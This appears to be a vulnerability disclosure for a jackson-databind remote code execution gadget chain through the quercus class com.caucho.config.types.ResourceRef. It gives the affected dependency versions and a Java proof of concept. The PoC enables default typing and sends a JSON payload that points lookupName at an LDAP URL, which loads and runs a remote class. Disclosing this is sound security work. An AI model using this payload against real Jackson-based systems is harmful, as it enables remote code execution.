hello，my name is threedr3am'follower.I found a jackson rce exploit chain.

### 一、New jackson-databind remote code execution exploit chain
1. The existence of caucho-quercus dependencies may lead to remote code execution

I found a new exploit chain，the class is "com.caucho.config.types.ResourceRef",
On a system using Jackson to parse Json and call "writeValueAsString" method,
if there is an caucho-quercus dependency, it can remotely execute RCE using defaultType

### 二、Vulnerability self-assessment
Recommended rating: Middle

### 三、Vulnerability details
1. Principle: When com.caucho.config.types.ResourceRef is deserialized, by specifying the value
  corresponding to the json key of lookupName as the ldap service, the ldap service can refer to
  the malicious class, thereby triggering its getValue method during deserialization.
  A chain that finally triggers InitialContext.lookup to the malicious class of the ldap service,
  thereby loading the remote class to local execution and achieving remote code execution RCE.

2. pom.xml

```
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.9.10.4</version>
</dependency>
<dependency>
      <groupId>com.caucho</groupId>
      <artifactId>quercus</artifactId>
      <version>4.0.63</version>
</dependency>
```

3. poc：

```
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();

String json = "[\"com.caucho.config.types.ResourceRef\",
  {\"lookupName\": \"ldap://localhost:43658/Calc\"}]";
Object o = mapper.readValue(json, Object.class);
mapper.writeValueAsString(o);
```
